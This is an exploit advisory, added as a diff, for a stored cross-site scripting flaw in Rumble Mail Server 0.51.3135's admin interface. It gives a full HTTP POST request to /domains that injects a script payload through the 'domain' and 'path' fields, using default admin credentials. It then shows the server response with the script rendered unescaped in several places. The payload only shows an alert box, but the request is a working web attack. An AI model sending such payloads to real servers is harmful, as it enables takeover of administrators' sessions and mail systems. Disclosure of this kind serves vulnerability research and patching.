@@ -1,0 +1,105 @@
+# Exploit Title: Rumble Mail Server 0.51.3135 - 'domain and path' Stored XSS
+# Date: 2020-9-3
+# Exploit Author: Mohammed Alshehri
+# Vendor Homepage: http://rumble.sf.net/
+# Software Link:  https://sourceforge.net/projects/rumble/files/Windows%20binaries/rumble_0.51.3135-setup.exe
+# Version: Version 0.51.3135
+# Tested on: Microsoft Windows 10 Education - 10.0.17763 N/A Build 17763
+
+# Info
+The parameters `domain` and `path` are vulnerable to stored XSS.
+
+# Exploit:
+POST /domains HTTP/1.1
+Host: 127.0.0.1:2580
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 119
+Origin: http://127.0.0.1:2580
+Authorization: Basic YWRtaW46YWRtaW4=
+Connection: keep-alive
+Referer: http://127.0.0.1:2580/domains?domain=%3Cscript%3Ealert(
+Upgrade-Insecure-Requests: 1
+
+domain=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&path=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&create=true
+HTTP/1.1 200 OK
+Connection: close
+Content-Type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" href="/favicon.ico " />
+<title>RumbleLua</title>
+<link href="rumblelua2.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+<div class="header_top">
+  <div class="header_stuff">
+    RumbleLua on a<br />
+    <span class="fineprint">Rumble Mail Server v/0.51.3135 <br />
+    </span>
+
+<a href="/"><img src="/icons/computer.png" align="absmiddle" /> Server status</a>
+<a href="/domains"><img src="/icons/house.png" align="absmiddle" /> Domains & accounts</a>
+
+<a href="/users"><img src="/icons/group.png" align="absmiddle" /> RumbleLua users</a>
+<a href="/settings"><img src="/icons/report_edit.png" align="absmiddle" /> Server settings</a>
+<a href="/modules"><img src="/icons/plugin_edit.png" align="absmiddle" /> Set up modules</a>
+<a href="/systeminfo"><img src="/icons/page_white_find.png" align="absmiddle" /> System logs</a>
+<a href="/queue"><img src="/icons/clock.png" align="absmiddle" /> Mail queue</a>
+
+</div>
+</div>
+<div id="contents">
+  <h2>Domains</h2>
+<p>
+  <table class="elements" border='0' cellpadding='5' cellspacing='1'><tr><th>Create a new domain</th></tr><tr><td><b><font color='darkgreen'>Domain <script>alert("XSS")</script> has been created.</font></b></td></tr><tr><td>			<form action="/domains" method="post" id='create'>
+			<div>
+			<div >
+				<div class='form_key'>
+					Domain name:
+				</div>
+				<div class='form_value'>
+					<input type="text" name="domain"/>
+				</div>
+			</div>
+
+			<div>
+				<div class='form_key'>
+					Optional alt. storage path:
+				</div>
+				<div class='form_value'>
+					<input type="text" name="path"/>
+				</div>
+			</div>
+
+
+			<div class='form_el' id='domainsave' >
+				<div class='form_key'>
+						<input type="hidden" name="create" value="true"/>
+					<input class="button" type="submit" value="Save domain"/>
+					<input class="button"  type="reset" value="Reset"/>
+				</div>
+			</div>
+			<br/><br/><br/><br/><br />
+			</div>
+			</form>
+			</td></tr></table></p>
+<p>&nbsp;</p>
+<table class="elements" border='0' cellpadding='5' cellspacing='1'>
+  <tr><th>Domain</th><th>Actions</th></tr>
+<tr><td><img src='/icons/house.png' align='absmiddle'/>&nbsp;<a href='/accounts:<script>alert("XSS")</script>'><strong><script>alert("XSS")</script></strong></a></td><td><a href="/domains:<script>alert("XSS")</script>"><img title='Edit domain' src='/icons/report_edit.png' align='absmiddle'/></a>  <a href="/domains?domain=<script>alert("XSS")</script>&delete=true"><img title='Delete domain' src='/icons/delete.png' align='absmiddle'/></a></td></tr></table>
+</div>
+<br />
+<p align="center">
+Powered by Rumble Mail Server - [<a href="https://sourceforge.net/p/rumble/wiki/Home/">wiki</a>] [<a href="https://sourceforge.net/projects/rumble/">project home</a>]
+</p>
+</body>
+
+
+</html>
